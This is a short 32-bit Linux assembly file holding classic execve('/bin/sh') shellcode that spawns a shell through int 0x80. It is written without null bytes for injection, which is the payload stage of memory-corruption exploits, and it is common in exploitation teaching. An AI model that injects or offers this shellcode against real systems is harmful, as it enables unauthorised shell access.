	global _start

	section .text
_start:
	xor	edx,edx		; edx=NULL
	push	edx		; push NULL
	push	0x68732f2f	; eax='//sh'
	push	0x6e69622f	; eax='/bin'
	lea	eax,[edx+11]	; execve syscall no.
	mov	ebx,esp		; ebx='/bin/sh\0'
	push	edx		; push NULL
	push	ebx		; push '/bin/sh/\0'
	mov	ecx,esp		; ecx=['/bin/sh\0', NULL]
	int	0x80
